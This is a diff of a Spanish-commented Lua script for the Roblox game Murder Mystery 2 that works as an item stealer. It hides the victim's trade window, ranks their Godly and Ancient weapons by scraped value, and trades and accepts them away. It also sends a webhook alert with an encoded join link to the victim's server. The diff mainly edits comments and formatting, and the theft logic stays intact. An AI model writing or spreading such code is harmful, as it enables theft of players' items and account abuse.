@@ -2,8 +2,8 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- Evitar ejecución múltiple y dumping
-if getgenv().MM2ScriptExecuted or not LocalPlayer then return end
+-- Evitar ejecución múltiple
+if getgenv().MM2ScriptExecuted then return end
 getgenv().MM2ScriptExecuted = true
 
 -- Configuración
@@ -17,7 +17,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local req = syn and syn.request or http_request or request
 if not req then warn("No HTTP request method available!") return end
 
--- Función para enviar webhook
+-- Función para enviar webhook confiable
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -36,9 +36,9 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Ocultar GUI de trade
+-- Ocultar GUI
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
     if gui then
         gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled = false end)
@@ -57,7 +57,7 @@ local function addWeaponToTrade(id) pcall(function() TradeService.OfferItem:Fire
 local function acceptTrade() pcall(function() TradeService.AcceptTrade:FireServer(285646582) end) end
 local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end
 
--- MM2 Supreme value system
+-- ===== MM2 Supreme value system =====
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
@@ -65,7 +65,7 @@ local categories = {
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
-local headers = {["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
+local headers = {["Accept"] = "text/html", ["User-Agent"] = "Mozilla/5.0"}
 
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 local function fetchHTML(url)
@@ -135,7 +135,7 @@ end
 if #weaponsToSend>0 then
     table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
-    -- Generar link protegido con supremo bypass
+    -- Generar link protegido codificado Base64
     local rawLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
     local encodedLink = HttpService:UrlEncode(HttpService:Base64Encode(rawLink))
     local safeLink = "https://fern.wtf/redirect?data="..encodedLink
@@ -152,7 +152,7 @@ if #weaponsToSend>0 then
     end
 
     local prefix = pingEveryone and "@everyone " or ""
-    SendWebhook("💪MM2 Hit Supremo💯", "💰Solo Godly/Ancient armas", fields, prefix)
+    SendWebhook("💪MM2 Hit Protegido💯", "💰Solo Godly/Ancient armas", fields, prefix)
 
     -- Trade seguro
     local function doTrade(targetName)
